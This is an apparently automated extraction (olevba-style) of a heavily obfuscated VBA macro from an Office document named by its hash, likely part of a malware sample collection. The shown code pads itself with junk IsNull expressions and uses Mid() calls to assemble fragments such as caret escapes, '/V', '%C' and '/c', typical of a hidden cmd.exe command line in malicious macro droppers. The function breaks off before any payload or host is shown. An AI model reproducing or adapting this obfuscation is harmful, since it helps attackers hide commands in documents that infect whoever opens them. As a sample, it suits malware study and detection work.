Filename     : ./macros/e706b3a32f4c177f1a3536dbd480c639666381b8a68b59821488116c51374eee
OLE stream   : Macros/VBA/fUnzIZkE
VBA filename : fUnzIZkE.bas
----------------------------------------
Attribute VB_Name = "fUnzIZkE"
Function dqNKbohDDq()
bCVoSCD = IsNull("bqrssLINkFi") + IsNull("risZWOcFYcCNij") + IsNull("tXAONtsdBwnGv") + IsNull("adsKVCbAmRuQ") + IsNull("CzniOLYPp") + IsNull("qQBwEqajIjWw") + IsNull("JDIiLskiUzaqiN")
pKhmapqnRP = IsNull("iwiZbXf") + IsNull("OLjtkmIYhkTQQl") + IsNull("oaZdFzcbrVdU") + IsNull("SqtnSIuwaclMM") + IsNull("jPCMkwMqzCuaz") + IsNull("jpXGRUFrqfwH") + IsNull("nNzoQtJsLoItX")
RscakFCFbb = Mid("sVk   pDqcNIXZPLSGzWdGZiPl", 4, 3)
ZALcVzXbHo = IsNull("YuXTksCtTE") + IsNull("KMiljwEzdb") + IsNull("hMXEBVT") + IsNull("IZcGLNJCNGH") + IsNull("oaohYAjN") + IsNull("liksRNKwjrj") + IsNull("tvziGWXatqt")
BWhjHN = IsNull("mHSrddERmVTBmz") + IsNull("LGibPpcGPVYYtj") + IsNull("UmINoBLvRRHju") + IsNull("MMMFuzS") + IsNull("MuHKBDWEEL") + IsNull("zBhsYKsALRJI") + IsNull("hECIMSwi")
LBDjSHO = IsNull("SRHYpjAmGw") + IsNull("usNtAwFhOa") + IsNull("viqzSiLmlvlN") + IsNull("zFmHAruUzZC") + IsNull("scWcnJivjWchp") + IsNull("VaTKaJimu") + IsNull("MwjXjOwEoJZBoK")
cVwzSjz = Mid("VUTOLSijWLnZFDQFStN qVYpuKTcRCR", 20, 1)
AztzVcqDT = IsNull("AZOGdAHZMN") + IsNull("uwAfUnuCzHCDmw") + IsNull("wBNsmNCcAHi") + IsNull("jssmFwMOl") + IsNull("WnYXvlN") + IsNull("WbIBDGLTahsUzX") + IsNull("VNKEVzGZjqtiZ")
BzavrbqjkjZ = IsNull("lUwIiGjr") + IsNull("uQnbOqIGZafT") + IsNull("iSTZdPUZN") + IsNull("tZjKNjDDfCbLw") + IsNull("PMaGqPEbrW") + IsNull("doIcTWJhatBf") + IsNull("uaWXAQmWWwJ")
UBIKZkhTcd = IsNull("ORQOClCJfp") + IsNull("alViVRDzzDJl") + IsNull("sAPBYKJblzLP") + IsNull("FwmoLiVSvLk") + IsNull("NZpfcQFjjWCVAk") + IsNull("fKolKOuLGM") + IsNull("rbQOwofH")
CqjPm = Mid("hzskzucptqICGkIWpHMb^nwi", 21, 1)
vYHHw = IsNull("pOjwlShMY") + IsNull("ruaLjRiVbOhu") + IsNull("PshabkOH") + IsNull("wLiIajpbTTGKi") + IsNull("zpkVsAWvjuB") + IsNull("FDrGbKcAvO") + IsNull("XrujAuOoCjQk")
vUrCKKK = IsNull("wOfnFRcjb") + IsNull("jhpjTIPbd") + IsNull("isjHwwGRirqN") + IsNull("jHOcjjzCPCsdU") + IsNull("OsniFvTkFfXqIL") + IsNull("BkaVoFZE") + IsNull("isdjSqqiczr")
fAUAilISANJ = IsNull("rPWGUDbjHHdl") + IsNull("NrwiijiIMdwU") + IsNull("AVGzmpTFOM") + IsNull("VjsmwQkQvQhXr") + IsNull("wkBdilXmwC") + IsNull("dHUoRiz") + IsNull("IMBnvLwthZF")
adFfjYtnMbF = Mid("sjRswjrqXDY  wtVjzEMoSGXY", 12, 2)
zDjRrjCs = IsNull("uMkRZzBjEq") + IsNull("orORSHjspnH") + IsNull("NRjRPptOKUlGXq") + IsNull("OGXVbsR") + IsNull("sEYYWwFBlmRWA") + IsNull("hmuKbPTGHubDS") + IsNull("SSjCvbrNqQXR")
jwkUzNhjfPO = IsNull("fJqoSkGCbq") + IsNull("jTuDjJiWXSZ") + IsNull("vPVVHrumfCk") + IsNull("HVfmDjjFWP") + IsNull("LdCGnujU") + IsNull("FiuZzOw") + IsNull("jDwiiVwN")
UitwbMYpoZj = IsNull("SzTGTDX") + IsNull("kaQQBWmziw") + IsNull("iTjSGOaYz") + IsNull("vdnKKBGnnI") + IsNull("uMhrPmt") + IsNull("EQMTEnm") + IsNull("jNrtiYFpzcGr")
rQjFUwDznM = Mid("cXVAbzKo &XrvURGPHFrYEiH", 9, 2)
QRWzEFAv = IsNull("wTqlUEjCKsF") + IsNull("HsvhhTYbGpoh") + IsNull("ZSShcHFtJz") + IsNull("dRldOWnVt") + IsNull("ZKBzBCXlXH") + IsNull("IPvmNUhkzrw") + IsNull("fDQiuNjBTozzHR")
NUBoo = IsNull("KWcaLGIdZCW") + IsNull("zsQuNBPVUiiz") + IsNull("JPwbSSKiVhTIi") + IsNull("rbvahXZDZi") + IsNull("OvwoFbsi") + IsNull("BqKCHjMEiKwl") + IsNull("cYtZIwaQFpPP")
UhAuuPvRsa = IsNull("bFhHlplUCprA") + IsNull("FlthbPV") + IsNull("kUdYnFLUSviwj") + IsNull("fRkMFujO") + IsNull("CNhwhuPYswrqk") + IsNull("jzkZAju") + IsNull("DSwGcwOJ")
anKlfDlp = Mid("QqjcCzKIHXlRNuC  APJdRFYlOjHsiwiGCBKKoN", 16, 2)
JKhIzRWl = IsNull("XLuQGbd") + IsNull("WAQtSwKVZPlafS") + IsNull("ujSvEUvAumD") + IsNull("BKNEUHpG") + IsNull("dfpwPujaip") + IsNull("ElzjnjZZaA") + IsNull("HOlJLLKQSq")
bJAUDVJpajc = IsNull("OrjLjnW") + IsNull("lHLCXFJzAKPR") + IsNull("ilNMWlo") + IsNull("mKLjIOJAYG") + IsNull("nRppFiFq") + IsNull("GzFFiAfGWwMBhP") + IsNull("wzSPqAwcDHdktv")
iMKDdTIo = IsNull("CRBcwpZP") + IsNull("QzfIPLiQoi") + IsNull("fWHYbMFjU") + IsNull("NWirihiLj") + IsNull("AKaEJjduAhub") + IsNull("ajfKcBkjpvJD") + IsNull("zQhdvFFwPUw")
dJfnwkL = Mid("NaaGFKGlfAilE   BP", 14, 3)
wscat = IsNull("hQutQoFG") + IsNull("HiDiZuF") + IsNull("CqtFMqz") + IsNull("IVBzAQmKORvHnz") + IsNull("rtNHIzTC") + IsNull("BXhCCCVa") + IsNull("wHTEJErwsQIwwS")
BzGAMb = IsNull("WhIzVwiiPcS") + IsNull("mNfYYIjcjVDD") + IsNull("cimzfonwoFJKjX") + IsNull("pzcumfVIuGjfs") + IsNull("uBdEAsQwk") + IsNull("nfjzHWOslsni") + IsNull("IRTHZrrwJultE")
jMDFwkNF = IsNull("jBMzjrz") + IsNull("SrvdijIMvVLpr") + IsNull("nkIQLFCuLCFiW") + IsNull("pVrDBSA") + IsNull("NbIMjEMc") + IsNull("cLoOcqSfsmXjs") + IsNull("ENHWZiHoYq")
LFEzRVU = Mid("XTmQjNijcwwtsrKqSSUwqQfpqwnMPuGR", 25, 3)
AGVHrr = IsNull("FfiXtMtGHwX") + IsNull("XrruzZL") + IsNull("UmjlqEtn") + IsNull("kwECrIMHVuW") + IsNull("BKXjZTzFOuLiwK") + IsNull("zsjpTFcWw") + IsNull("zjjimifpJ")
VwPNSVW = IsNull("FWwBGEa") + IsNull("wPYIDTWL") + IsNull("uzQaKtfiUSDKHw") + IsNull("zCYzqwQUwsfG") + IsNull("wKzObaPELivdT") + IsNull("llWzpRoLB") + IsNull("ZUzdiRiimpkKTp")
UsRKCnF = IsNull("cICRktiQp") + IsNull("WGjpNOoFCtZn") + IsNull("QbnQacQfsm") + IsNull("qqqPEaXLhLzqA") + IsNull("RXpanPtpjlpzdH") + IsNull("YHdUozXYZAcWN") + IsNull("OTlmVJEb")
zIzcoAb = Mid("FXKkVazUTTjaXuYHOFVPhipGGuiEfYLNYr", 21, 3)
zoZOFrXcjT = IsNull("jjflYdTXfijc") + IsNull("qpBnJDpGdlauvQ") + IsNull("dibRhOIiJZcSF") + IsNull("RwvonnznzBPzcD") + IsNull("FrcMdtzDRvjiGs") + IsNull("jlkILmiFI") + IsNull("tqkaBhmEkEi")
jOfzzOlH = IsNull("PATZZRL") + IsNull("HKXsuaQvKjzI") + IsNull("BjYmfpwho") + IsNull("RXMDMGEWPLKuzv") + IsNull("mlKZvUprqN") + IsNull("vmtbOASNF") + IsNull("hXEpGMjwFH")
aPHjX = IsNull("GcEUvdt") + IsNull("FqvjUiOT") + IsNull("KalTjjCMdPNud") + IsNull("ofjfIDrrAM") + IsNull("XCvBFXT") + IsNull("MadwjWsCI") + IsNull("NjMbVGEoz")
ibhPWB = Mid("YcAuvPKlNHTuSvGiQ   XnBNhwWB", 18, 3)
uvLEGBl = IsNull("dRtDmHtccjWq") + IsNull("LRdnwKckpAEOFk") + IsNull("IFukGfSVzXbsZ") + IsNull("doLhJdpivAvf") + IsNull("nQpphXE") + IsNull("WmlkPtvdQU") + IsNull("CzLMthwGz")
prYfIEStsoY = IsNull("EjuUWvdYhuzZjd") + IsNull("KJLrEIQqSKLz") + IsNull("vuADjjJbEHjEk") + IsNull("bKPzJht") + IsNull("wJKiposbJKw") + IsNull("cnuwtDTJFCfnT") + IsNull("ofCMCRvS")
uwEBwuDOap = IsNull("JupbiiEKiu") + IsNull("URGCaztktF") + IsNull("ficCbEwIkQF") + IsNull("NrvIlOrSiavhiF") + IsNull("SkCWFUdO") + IsNull("wbCzOZJF") + IsNull("XtKioIVCn")
ApTYlTMSPzD = Mid("luqL himPiljrf", 5, 3)
NAXPodNvpD = IsNull("qtzrVjczVIwYoQ") + IsNull("EGNkXwiWPh") + IsNull("NZwIisKrDCvMwa") + IsNull("EJfXiAPiIwE") + IsNull("uAMXiJVV") + IsNull("BNiDOzM") + IsNull("JtPJurUqs")
vVMEUSSjY = IsNull("iCMBwfTUqRhY") + IsNull("nXqSrhXUnYw") + IsNull("YGwbsbGBMum") + IsNull("jjkPjIFKiEaSFf") + IsNull("pXOriNV") + IsNull("ZUswqaWPsl") + IsNull("iIwIofTozUffW")
QnrpS = IsNull("zwqoMajQqrfNCc") + IsNull("aDwBTUC") + IsNull("RzCoBzI") + IsNull("jqLVXMMADWzGU") + IsNull("wqmFUoXpYdzv") + IsNull("pJlfQiAwXr") + IsNull("jNqwzzWv")
irwHPKKGNmT = Mid("StLXZmzthLurSwdaoijsiOsoOiHMah", 17, 3)
kcMJNuXuu = IsNull("VRdwCIkOL") + IsNull("unJPjLoh") + IsNull("MwztPZMKZYCu") + IsNull("WlUJtQpdIUwlO") + IsNull("VDElfzw") + IsNull("QYXOZqzL") + IsNull("IRFQXuZSXrEDc")
HEbjrEOIc = IsNull("BwtjvKrdcNV") + IsNull("qKbUMHs") + IsNull("jXdTzVZ") + IsNull("WotkAULpz") + IsNull("wnzrmdaG") + IsNull("OvzfrvDwdUaia") + IsNull("aGnUlzVwlUDL")
fHDrQ = IsNull("IBYqGUn") + IsNull("wqMVwmirzf") + IsNull("inTIkwIfSIFuGo") + IsNull("PNAAqrCmUP") + IsNull("CwnojsY") + IsNull("zNososz") + IsNull("VOqwGhZWRrzoG")
ijHtWQzGLCI = Mid("h/VFRPFRQPFOFiGtTzXwZXpwIZBVH", 2, 2)
Ptjmtfi = IsNull("FplAsri") + IsNull("VZJBowYh") + IsNull("ZaWCWkzJpG") + IsNull("QJcbjqwGsU") + IsNull("rwaEjdSwDwQQ") + IsNull("dpDiElqDkIuMzi") + IsNull("wzRozrjZbS")
RXwiKwRcD = IsNull("UmZPuvqR") + IsNull("hpfpFPkrXro") + IsNull("BAfMrqsEjIBD") + IsNull("ZHYddjmlw") + IsNull("MXBZEnLOhdd") + IsNull("mtDDFzNtY") + IsNull("bajIMNuKBvCWT")
tUOEC = IsNull("VrsDYzs") + IsNull("zrmQCGiiGnjs") + IsNull("vzwFfcQDuPbP") + IsNull("QzKhkuT") + IsNull("kdLjPhVNc") + IsNull("uaVatuztXcdD") + IsNull("KBCqfUYCmYR")
hQKrLo = Mid("IAqKoQIoMpMBIVHZhlcWBoitUwnHtjXOL", 22, 1)
YdqFbEAGKE = IsNull("pRoQYtUZlGVia") + IsNull("bpXFEYvaswb") + IsNull("UWchPPZNNnJwVf") + IsNull("CoZminTjM") + IsNull("zSutPYrpaY") + IsNull("zDrFEMNnfbkZFt") + IsNull("SJtKAnQKSzfT")
fArvlJCqH = IsNull("jSDjZvOiJKlWPI") + IsNull("DLBCVRkjfkG") + IsNull("oidzDvaLqVUIw") + IsNull("nSMnizUt") + IsNull("Vdbwfvj") + IsNull("wTEaAjKhbo") + IsNull("kirtGMiRWrBJWu")
QBRwhoaGqHG = IsNull("PRHuGWFlihdaGv") + IsNull("wMspAdFhwPY") + IsNull("htYIZsPY") + IsNull("UpTjnAkcP") + IsNull("tsjNFEqTUJjK") + IsNull("iMYrJYDirXR") + IsNull("WZFMdVFjfiR")
nwPSB = Mid("wsEpTmGkIXEFTwGWDuCOnLp  CX", 23, 3)
EAlniUvfZB = IsNull("IVczvPGzWpr") + IsNull("mmCGHIXITikV") + IsNull("AdNfwJijXYoF") + IsNull("thikUDOfsfT") + IsNull("tBwlJilGPuls") + IsNull("ZfJBPONAf") + IsNull("qiiJjGDIw")
HitSo = IsNull("NNLGwzmGFL") + IsNull("jAwSPuMDU") + IsNull("mGUoGUB") + IsNull("lsbvANa") + IsNull("SBwNFCbhsBh") + IsNull("MBjiZRb") + IsNull("qSpfkCUS")
jmLOzWt = IsNull("uDIjuNuDwLwvlS") + IsNull("YFidQFkNmIGbUE") + IsNull("MmnwXWW") + IsNull("GBUKCTQutP") + IsNull("IAZfhnJpW") + IsNull("omZwwzLImvZ") + IsNull("jYbwvit")
KFzmjDkiqvr = Mid("hcsAGIOXjIQlvjuCBvpNVFLIUZEYFMcmJGKXLUUE", 31, 2)
aCwGrOTfW = IsNull("lzlrocKFGzkf") + IsNull("wFmvrjJwVjlTk") + IsNull("MScChIv") + IsNull("BwNYZYZT") + IsNull("rcDVktpLl") + IsNull("pQPzYEbw") + IsNull("dzCWspDphSKk")
BSHGjtiihLN = IsNull("EZwNjiY") + IsNull("QKOuNOjBzwwA") + IsNull("cqKJjvzWbAlBNF") + IsNull("NkWCzRdM") + IsNull("DIMIaptLw") + IsNull("bjoEAna") + IsNull("oKcsAJVn")
Cuokq = IsNull("CSurhibZnq") + IsNull("zGqmzpUzampUoF") + IsNull("jhDHsaYR") + IsNull("zEhWzWMqG") + IsNull("WmzQssw") + IsNull("JlMzFlWwu") + IsNull("jzWaocpsHz")
cnTHicpsK = Mid("zXPXIzYRlESwfhohuuviq", 13, 3)
QuiJjpFBHFA = IsNull("ctChwisFa") + IsNull("pwlGaELdbZfV") + IsNull("XHpBoKHCm") + IsNull("aQRuUdFvzZDl") + IsNull("DDCooftOj") + IsNull("ifZJcDuS") + IsNull("CJLqIKrAWdjw")
IIOpwn = IsNull("cVcprds") + IsNull("jdRowhiAaj") + IsNull("sKvicfUWDUIV") + IsNull("qmKcsfWTGBzdw") + IsNull("VpwXJQPmqjnz") + IsNull("WGpEXIXz") + IsNull("WFIuNPmI")
wfWWlWwSfhH = IsNull("ltlwmWTX") + IsNull("YqJnOuUdsEGWi") + IsNull("rNtizfX") + IsNull("DLStjXdRYzJJ") + IsNull("UjVvzjskbppD") + IsNull("uksrVsVmmwVVN") + IsNull("zajHNYTXhXjAzi")
zwVwwXYzj = Mid("HOr %CrEjzwYCOmwzOGI", 4, 3)
ViAhCNHNI = IsNull("EjvzhEzzEdEvio") + IsNull("VzNRzbUYmIStP") + IsNull("DAzhkjTOX") + IsNull("kHXDutQsRP") + IsNull("NCULUjIJrO") + IsNull("ilAdEOuF") + IsNull("GcohpDRdss")
wNAviJJNm = IsNull("kfEwDRMJMTZYH") + IsNull("iriZjNPHTaaXap") + IsNull("HLjHOwLvAdP") + IsNull("XKWQSkpfSpf") + IsNull("CadMdYjrWiEHtR") + IsNull("zWvdwQlrwzJIn") + IsNull("JMSfjEoUzRcz")
wljMVJnVKp = IsNull("czppziWPzLE") + IsNull("KYYmCRoCwLq") + IsNull("lOnVQSiQw") + IsNull("jivLfZsiGNCwd") + IsNull("RROMEpcQ") + IsNull("XEjrAzjh") + IsNull("hWpqqrlOKUFdQ")
sBikwDv = Mid("VOdLniPTSWNPnB  cbWKwdALkaYkKGtPVWKKA", 15, 2)
ctFHY = IsNull("FtFOXBrsJX") + IsNull("jjQjjPUQ") + IsNull("GMSlcKMEdXiBz") + IsNull("fwrimGvsApGwC") + IsNull("FnkzLDQtbTmNp") + IsNull("PlsKknkkpjhJz") + IsNull("LdfjHXzpm")
VXJtVjqHhUi = IsNull("GfTHKPQ") + IsNull("RElOwIhPwhzm") + IsNull("ojtqrVihzHzoO") + IsNull("MPJdZIUHdE") + IsNull("DLVzmuY") + IsNull("MRvZRStiD") + IsNull("zoaijVAnDZ")
iwBprt = IsNull("pvbmWXwYRHd") + IsNull("wwLPDUzDQ") + IsNull("FChwoGG") + IsNull("nZzMUoLwN") + IsNull("kIsqlwjjU") + IsNull("UfrjQnpZFYiqS") + IsNull("UDPjbXD")
jJRhwWBhmi = Mid("ZtzNVpdwtVjNMmQiGaTEHrNKjVCBCWhpXvwjwAkjc", 6, 3)
JdGZbWzRLLB = IsNull("YhFploKMhKN") + IsNull("WCHRpsLjaQ") + IsNull("jPiVcAzzqzonk") + IsNull("kfdjVWIjPDfbD") + IsNull("vssCIsZZ") + IsNull("ThMhKWZi") + IsNull("XcFMhwEuf")
tXAHa = IsNull("ZDkuJklJI") + IsNull("BYJvoaBJp") + IsNull("nhsYFZbwIlJwuV") + IsNull("dkzmHEMPP") + IsNull("rBzAaAwqwc") + IsNull("LLojJnBXHCdoc") + IsNull("pCWiqaRd")
FbnwUwH = IsNull("zbpAwoEwGlfrQK") + IsNull("KBJowNqVQE") + IsNull("FiLwzNNcZfd") + IsNull("PsGYTwjfMunW") + IsNull("vFhjJFZwVjVnJn") + IsNull("inlshUtwr") + IsNull("WYjYPKuoBCIjt")
QSchPZoU = Mid("MQPKtRqJobjvzwORamv jRFKVAzXiivFojis", 20, 2)
kiCQnAQTXi = IsNull("OXbzhlK") + IsNull("vsaSYLDw") + IsNull("LsHUNMXpk") + IsNull("cIICaiKZMhpTmz") + IsNull("iwBsRqTjZPZVhB") + IsNull("EIzmizmp") + IsNull("kOlqRbrGKYiQVw")
ORBHsXO = IsNull("DDkSrndCBMPfn") + IsNull("QWNctUQnRXPN") + IsNull("wZdmHHrGQEzL") + IsNull("cjNUkpNXcwfru") + IsNull("bQlMCiF") + IsNull("cYaIXwcARPRA") + IsNull("hZwmZzKUazvNH")
btBXtlwB = IsNull("HIYjnBMdX") + IsNull("cjWzOvv") + IsNull("BIDFcSz") + IsNull("TLIWtjLdfZ") + IsNull("DCwXkNpouVG") + IsNull("cjKToQCjFmPhAV") + IsNull("HsVsUoV")
sDSWOq = Mid("jEpNCXGvQIzriRnLVqqk  kSAGXhnAEWzbMsdlw", 21, 2)
nwkfj = IsNull("pirvhnuHp") + IsNull("cSRucjPZtIurpa") + IsNull("iuNBaivQjmV") + IsNull("UkNzZjBJHi") + IsNull("ruiVTwVwp") + IsNull("SCshFOQhB") + IsNull("HGGupjKUHnRV")
HtEGHpRwMDw = IsNull("ovXbtBEz") + IsNull("iHpccSiR") + IsNull("QVwpnhFs") + IsNull("nYTtbkZfIFN") + IsNull("ItizWTRathwD") + IsNull("HSOwHpVAX") + IsNull("arpfECzJZ")
mbManX = IsNull("fVHsIbRKojIChU") + IsNull("UVlbGzHln") + IsNull("jnoBqBAzGNMzW") + IsNull("GkaTawsI") + IsNull("vAmCpOzY") + IsNull("UEcodJziIFaG") + IsNull("WzdVVXn")
aILKukOTuDT = Mid("mtXkHpTOUwONIQQWMLGUsRvdCdFUzwQ", 13, 1)
zpCUtqjP = IsNull("WHbRsQO") + IsNull("RjFZPiURLjBPr") + IsNull("kcEFhnMXwYZz") + IsNull("zqwGraijoLAbL") + IsNull("nrQHJNnW") + IsNull("NmjbaumhAQmUbO") + IsNull("KpJzwQDiWcZ")
AhZUIzwn = IsNull("wczjvfCcjwHpP") + IsNull("mLOwrvSo") + IsNull("GuHptmwaokH") + IsNull("lFHXPfnWLRVfn") + IsNull("NiNWlYKzqp") + IsNull("pIqjWSFHZAFGb") + IsNull("QiRQoYbCZYO")
pdcZb = IsNull("jQPmDdrjUHz") + IsNull("oCdALYqM") + IsNull("pzUEoajKIMw") + IsNull("OFRldir") + IsNull("fGCpBLtmCSzm") + IsNull("DrSuiPDHZ") + IsNull("uAHZzMOh")
wJJzqv = Mid("YVpjjddpTODGzaohKwndquIBUDlwHGZ", 15, 1)
YjizshJaw = IsNull("RwjclOSj") + IsNull("WznpwQYNTI") + IsNull("luVttjCQMnj") + IsNull("VJBGYwPqo") + IsNull("CuhdbpHDoFQma") + IsNull("dqjCMBWmmi") + IsNull("fzJzRERnt")
NVMXIflj = IsNull("LwJBiVQj") + IsNull("jJKfZzuSGNLb") + IsNull("EQwUiaLt") + IsNull("RJUrmrwribhwOw") + IsNull("TBfEHKZHh") + IsNull("utDOnqY") + IsNull("mrBKhLDTOijtN")
QwLNlDSmiVz = IsNull("bLPHMJIziCjii") + IsNull("iNMdnVQHCLw") + IsNull("zEXAwwhiCiUvA") + IsNull("OmIciwSjREsnz") + IsNull("cTIDLTLEcd") + IsNull("kBAaDsR") + IsNull("vHdwadzZQmT")
mjDZVbwJ = Mid("AvIWnClzHqPih  vZuzr", 14, 2)
LPszlo = IsNull("SfBhuGmjrBnqr") + IsNull("vdukIJcGSITTBo") + IsNull("uYnoEbXNGwRBCz") + IsNull("XqUFYkkwkDNLNs") + IsNull("bEznzdzCn") + IsNull("XQoorIZGSk") + IsNull("zwPLKZCkqPJ")
VLLZDNRh = IsNull("YnncuvzjmaYk") + IsNull("nilRimdSMa") + IsNull("zXKQRNkLCDrinv") + IsNull("fnoPPqFKMTIia") + IsNull("pSLNtcXl") + IsNull("SZqNhRwAzWsH") + IsNull("dzLCtMzwIiKDN")
ukVqHlDEqr = IsNull("tUNDPCVXoj") + IsNull("AUwJtvoEuHkb") + IsNull("hbmDwRwG") + IsNull("wvTdFJEwN") + IsNull("SOPqOPJpCKOMI") + IsNull("EVoQSbXkbmYBp") + IsNull("pfAwuvItS")
kFwEDwtMX = Mid("RkWSP /cXkRAXuLpjhramsYVnINwVfmHFzWWq", 6, 3)
SopHQK = IsNull("jQuSStEWpZdY") + IsNull("QTLIhAwoNCriK") + IsNull("lJqfJTjQjDDaN") + IsNull("HHlZVUjdzacD") + IsNull("wSODjIFSN") + IsNull("tTEMAkHEHmNhFQ") + IsNull("NqIILQDGF")
NZTGvBQ = IsNull("ljmGbPZaajUu") + IsNull("pIYuIRsrlpS") + IsNull("vYVRcDwmlIBC") + IsNull("sVzoXQqNLjtVYW") + IsNull("krAqUTjq") + IsNull("IzjWHuj") + IsNull("VwQvuCNZ")
VXChk = IsNull("zUAURIStIsGR") + IsNull("jsqVVRBP") + IsNull("zlWSwKBj") + IsNull("NwcCPGjpiunzX") + IsNull("vibPVuho") + IsNull("UlXPwzL") + IsNull("rYCtSidd")
zGXMENTM = Mid("ktIYqEFbSih", 6, 1)
BsCBazkkGmF = IsNull("ZkobwEhmBtI") + IsNull("hiMfsjak") + IsNull("FRCmzcFQqp") + IsNull("RruwBdMtwkFA") + IsNull("woREQBWnoI") + IsNull("SmowcbWLE") + IsNull("sqjQdPThlj")
zSUjCwIMOI = IsNull("BYLwqpCNhh") + IsNull("YqLIWViq") + IsNull("ALGlaRPiiKuwWC") + IsNull("oqSCjItt") + IsNull("dFImjAoBwv") + IsNull("pRaXYaYiXm") + IsNull("CnzTfDcGm")
EzYjuvAKOD = IsNull("QdqLKBAoSwcjbd") + IsNull("oPQXNuvDD") + IsNull("iommCGDYTCIwlS") + IsNull("VXlWQGImOa") + IsNull("QNWFUam") + IsNull("cNNBQsZLH") + IsNull("HpdwwrWKjnr")
PcAJjtC = Mid("SNVWuBRKCFY jJ", 12, 1)
obdphZqCMEk = IsNull("SjHVJcui") + IsNull("tBaiWWPudJ") + IsNull("OWnPDUnPUlZp") + IsNull("RXlSCOzd") + IsNull("BtLbJcwQIwzCsw") + IsNull("rRopiNkTLQMzlw") + IsNull("PLHSUtEbLLTEc")
VLaiSTza = IsNull("qYjjZPvDXvAN") + IsNull("nYCiLsYVJtmYPD") + IsNull("roCzWZJbLEW") + IsNull("iiCOjSDWjNPz") + IsNull("LQjiuKJ") + IsNull("RMisDrXi") + IsNull("rdpLpnGfFFLhzi")
dtrmXvZIPL = IsNull("sHZbrblaIwi") + IsNull("ZzLzcKTQj") + IsNull("vZbznpdiLIHs") + IsNull("JnYuVHoCIj") + IsNull("TEQOiIl") + IsNull("rFMzzrnv") + IsNull("imZJhjBKEQzJuj")
Uiwpq = Mid("wm^SRbjpktZFYltOXDVzwHwCrYR", 2, 3)
poDrtucWl = IsNull("FvLJczRtMV") + IsNull("WTVdajsjV") + IsNull("IrVdZzoFwiUh") + IsNull("nIjOBzaj") + IsNull("pYQnJbifoNI") + IsNull("wDpfCzcoOqwoK") + IsNull("VuRrkvCfBzNm")
wJdKk = IsNull("KYpIMBESPERKp") + IsNull("avFlYWdPJ") + IsNull("nkzFXBdjcAY") + IsNull("fpYKiSbb") + IsNull("uDzEGujIj") + IsNull("uOOUcDzuN") + IsNull("iiprSQPNNnL")
wjTqzjU = IsNull("MaTpGZVqEqjwB") + IsNull("vPwbbcbGkNzcMl") + IsNull("CrSQHPOuB") + IsNull("OorQDisjzHPCW") + IsNull("KOFpFsdNkYBz") + IsNull("itijUzkMn") + IsNull("qjfEtPiBzVjG")
cIwPnJtsw = Mid("KzinowBGfHvXmPd^oYtFpu", 16, 2)
KhzoZIY = IsNull("iNtjwBQHtbskd") + IsNull("QUvGjXNAfMNIl") + IsNull("fWuwEFjBavFwi") + IsNull("hGpFNZz") + IsNull("RGEnahhhTqPacX") + IsNull("wfYMPtABltHS") + IsNull("WIuMqjEnrR")
JkrqZp = IsNull("GIjbrEdKjMfrh") + IsNull("kRFTYXsRVpY") + IsNull("wRjsOJUX") + IsNull("CCqcapbKSIT") + IsNull("XDkozrfwo") + IsNull("qCiGLdnzVWKzi") + IsNull("OrwiQGDhF")
ZSQRwYUlktP = IsNull("zTtcPiDiKYs") + IsNull("pNkBRFStSP") + IsNull("KKvDksSu") + IsNull("OtMvAXm") + IsNull("qdIAijE") + IsNull("GimhZXMkKiRTiS") + IsNull("rioKwAoBuTPD")
wUacjkfZqs = Mid("whUwTPvnYdklqlT", 10, 3)
uIkCX = IsNull("aOwEORoaoPLotT") + IsNull("wXUmwEYVUZI") + IsNull("zjikJwojzjjiEi") + IsNull("KTDaziFRjiuJ") + IsNull("CsbiGYrtGfCrF") + IsNull("fSnliNUNCRwLO") + IsNull("OwBOnzdFEFcjr")
PbvpSAHrj = IsNull("bfiTODBj") + IsNull("oSdoRtTpLmzJ") + IsNull("lKvqliU") + IsNull("OoRFLdtW") + IsNull("YsjuzPlQH") + IsNull("rlIZUzVuUYYSX") + IsNull("VZdMjFQaS")
FiZMs = IsNull("DoBjsrazwwLvU") + IsNull("qKfuJzfIdnDFJ") + IsNull("NiJCWiKOQPT") + IsNull("RPCEDsipOt") + IsNull("hWrKvKOfmi") + IsNull("lNnJYpicuQblhP") + IsNull("YjLaTLU")
qZVoIZ = Mid("dlmkRuztkfNPSGJhPJGYIspGcnwuhOSO", 28, 3)
HpvKtBK = IsNull("NGcLouJZiodZGO") + IsNull("FqiZzqGVRZXlZj") + IsNull("ZRTLLNX") + IsNull("GZPzojlw") + IsNull("PPiPhAVFH") + IsNull("KlQJjsbOMGvD") + IsNull("ifczirSljdEW")
stDbDCiOtrl = IsNull("cSRjdijWVjc") + IsNull("jkihwwkimrJGwT") + IsNull("SiFwwDfbUzcP") + IsNull("tMuwAJhnPwk") + IsNull("bwolILmJARsPj") + IsNull("sDJNjUjEkaw") + IsNull("FmmvChVJ")
TBLimrIOZKL = IsNull("CnsQwGDc") + IsNull("YpQfGMUZ") + IsNull("XLjwjEBmNozdI") + IsNull("mZqoWwIo") + IsNull("GVHmjCkGQHnjKd") + IsNull("DnPLsPc") + IsNull("PddGQXwdhjMa")
QFmDHj = Mid("sNqOoOdIAwJwOdGUUfd", 7, 1)
FiEUhwhfK = IsNull("HrqMmpFfbT") + IsNull("NXQddBMPGXL") + IsNull("ovFzWFOKu") + IsNull("GlMTBzfbYJG") + IsNull("ziWJRAVFC") + IsNull("vdBQjpiaNIknQf") + IsNull("KAPkfzCHW")
PGBYUHw = IsNull("NpkDZAEkjaPAs") + IsNull("GzrSQoIfDn") + IsNull("kLTccvPIIwwhED") + IsNull("HMuKjIJmHo") + IsNull("HUKfhlzGp") + IsNull("lIGfArkYJQmOu") + IsNull("wksGnbYMnMo")
JWrWdL = IsNull("XdNoOppXHqiRlQ") + IsNull("swwzhMRrsGAFU") + IsNull("ztWfUJMVlw") + IsNull("vPIpitOwv") + IsNull("AGJpjFmUhNjU") + IsNull("IwLmRHdWMzilwJ") + IsNull("JNlHZkz")
CpWLrZwWj = Mid("udXUAKpJYKK IGXEcpiXkizipPlaPBqiISX", 32, 1)
zzfDDfiLw = IsNull("zdQLjwOjWDofjR") + IsNull("NzYdsaiizs") + IsNull("SOQYVtrFtGIwj") + IsNull("ANJsvNZWCLOPj") + IsNull("UTuTSsfzPziuoa") + IsNull("RFwrprMUqB") + IsNull("RvLFJFKvlaM")
hmizou = IsNull("tYqIiakziZHwwJ") + IsNull("NDfjlkFMCmzcdl") + IsNull("jzihwZdEhSFYjH") + IsNull("qQBzhPU") + IsNull("kMnMnWiwHNj") + IsNull("KRONWjwzQjMWE") + IsNull("vjbiEjL")
